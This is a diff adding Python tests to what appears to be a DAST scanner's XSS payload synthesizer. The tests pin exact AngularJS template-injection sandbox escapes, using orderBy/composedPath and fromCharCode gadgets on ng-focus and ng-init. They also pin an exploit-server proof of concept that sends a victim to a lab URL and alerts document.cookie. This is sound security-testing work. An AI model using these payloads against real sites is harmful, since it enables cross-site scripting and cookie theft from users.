@@ -97,3 +97,135 @@ def test_primitives_fall_back_to_defaults(monkeypatch):
         "toString().constructor.prototype.charAt=[].join;"
         "[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1"
     )
+
+
+# ── AngularJS HTML-element directive gadget (CSTI under CSP) builders ─────────
+
+def test_orderby_alert_expr_is_quote_free_with_numeric_arg():
+    # The orderBy/composedPath gadget fires alert(<MARK>); the MARK is numeric so the only quotes
+    # are the single quotes wrapping the orderBy string predicate (no nested/double quotes).
+    expr = synth.orderby_alert_expr("424242")
+    assert expr == "$event.composedPath()|orderBy:'(z=alert)(424242)'"
+    assert '"' not in expr  # safe inside a double-quoted ng-focus="..." attribute
+
+
+def test_html_directive_payload_rides_autofocus_ng_focus():
+    built = synth.html_directive_payload("777", trigger="ng-focus")
+    assert built == (
+        '<input id=x autofocus ng-focus="$event.composedPath()|orderBy:\'(z=alert)(777)\'">')
+    # The MARK appears as the alert argument, so the dialog will echo it.
+    assert "(z=alert)(777)" in built
+
+
+def _decode_fromcharcode(s: str) -> str:
+    import re
+    m = re.search(r"fromCharCode\(([\d,]+)\)", s)
+    assert m, f"no fromCharCode in {s!r}"
+    return "".join(chr(int(c)) for c in m.group(1).split(",") if c)
+
+
+def test_ng_init_alert_expr_is_event_free():
+    # ng-init runs at LINK time with NO $event, so its escape must NOT reference $event. It reuses
+    # the increment-1 no-strings charAt/fromCharCode escape building x=alert(<arg>).
+    expr = synth.ng_init_alert_expr("777")
+    assert "$event" not in expr
+    assert "composedPath" not in expr
+    assert '"' not in expr  # safe inside a double-quoted ng-init="..." attribute
+    assert expr.startswith("toString().constructor.prototype.charAt=[].join;[1]|orderBy:")
+    # The fromCharCode codes decode to the x=alert(<arg>) assignment the orderBy trigger evaluates.
+    assert _decode_fromcharcode(expr) == "x=alert(777)"
+
+
+def test_ng_init_setter_expr_is_event_free_window_name():
+    # The ng-init compile/fire oracle sets window.name via the SAME event-free escape (no alert).
+    expr = synth.ng_init_setter_expr("9777")
+    assert "$event" not in expr
+    assert "alert" not in expr
+    assert _decode_fromcharcode(expr) == "x=name=9777"
+
+
+def test_html_directive_payload_ng_init_is_event_free():
+    # The ng-init gadget rides ng_init_seed (no autofocus) and carries the EVENT-FREE escape — it
+    # must NOT contain the $event.composedPath() gadget (which would throw at link time).
+    built = synth.html_directive_payload("777", trigger="ng-init")
+    assert built.startswith('<input id=x ng-init="')
+    assert "autofocus" not in built
+    assert "$event" not in built
+    assert "(z=alert)" not in built
+    assert _decode_fromcharcode(built) == "x=alert(777)"
+
+
+def test_html_sentinel_payload_ng_init_is_event_free_window_name():
+    built = synth.html_sentinel_payload("9777", trigger="ng-init")
+    assert built.startswith('<input id=x ng-init="')
+    assert "$event" not in built
+    assert "alert" not in built
+    assert _decode_fromcharcode(built) == "x=name=9777"
+
+
+def test_html_directive_payload_matches_curated_vector():
+    # The synthesized ng-focus gadget must equal the curated angular_html_directive 1.4 seed
+    # (with {MARK} filled), so synthesis is provably the same grammar, not a divergent form.
+    built = synth.html_directive_payload("424242", trigger="ng-focus")
+    stored = (get_value("xss", "angular_html_directive", {}) or {})["1.4"][0]
+    assert built == stored.replace("{MARK}", "424242")
+
+
+def test_html_sentinel_payload_sets_window_name():
+    # The compile/fire oracle element sets window.name to the numeric sentinel (no alert).
+    built = synth.html_sentinel_payload("9777", trigger="ng-focus")
+    assert built == (
+        '<input id=x autofocus ng-focus="$event.composedPath()|orderBy:\'(z=(name=9777))\'">')
+    assert "alert" not in built
+
+
+def test_html_sandbox_probe_is_scope_safe():
+    expr, expected = synth.html_sandbox_probe()
+    assert expr == "[1]|orderBy:'(z=toString)()'"
+    assert expected == "1"
+    assert "$event" not in expr  # evaluable through the app's $parse without a DOM event
+
+
+def test_html_primitives_fall_back_to_defaults(monkeypatch):
+    import dast.triage.xss_synthesis as mod
+    real = mod.get_value
+
+    def fake(category, key, default=None):
+        if (category, key) == ("xss", "angular_html_primitives"):
+            return {}
+        return real(category, key, default)
+
+    monkeypatch.setattr(mod, "get_value", fake)
+    assert mod.html_directive_payload("777", trigger="ng-focus") == (
+        '<input id=x autofocus ng-focus="$event.composedPath()|orderBy:\'(z=alert)(777)\'">')
+
+
+def test_exploit_server_gadget_is_fragment_focus_form():
+    # The raw element the exploit-server PoC injects: id=x + ng-focus composedPath/orderBy gadget,
+    # NO autofocus (the victim focuses it via the #x fragment), arg = document.cookie.
+    gadget = synth.exploit_server_gadget()
+    assert gadget == (
+        "<input id=x ng-focus=$event.composedPath()|orderBy:'(z=alert)(document.cookie)'>")
+    assert "autofocus" not in gadget
+    assert "ng-focus" in gadget and "composedPath" in gadget and "orderBy" in gadget
+
+
+def test_exploit_server_poc_builder_root_path():
+    # Given a target lab origin + injection point, build the exact copy-paste exploit-server PoC:
+    # <script>location='<origin>/?<point>=<gadget>#x';</script> — mirrors the PortSwigger solution.
+    poc = synth.exploit_server_poc("https://lab.example.net/", "search")
+    assert poc == (
+        "<script>location='https://lab.example.net/?search="
+        "<input id=x ng-focus=$event.composedPath()|orderBy:'(z=alert)(document.cookie)'>"
+        "#x';</script>")
+    # Load-bearing pieces are present and the focus fragment trails the gadget.
+    assert "ng-focus" in poc and "composedPath" in poc and "orderBy" in poc
+    assert poc.endswith("#x';</script>")
+
+
+def test_exploit_server_poc_builder_preserves_path_and_point():
+    # Built from the ACTUAL target URL + point: a non-root path is kept; an existing query is dropped
+    # (the gadget owns the injection point), and the trailing #x focus fragment is appended.
+    poc = synth.exploit_server_poc("https://app.example.com/app/search?q=1", "q")
+    assert poc.startswith("<script>location='https://app.example.com/app/search?q=<input id=x ")
+    assert poc.endswith("#x';</script>")
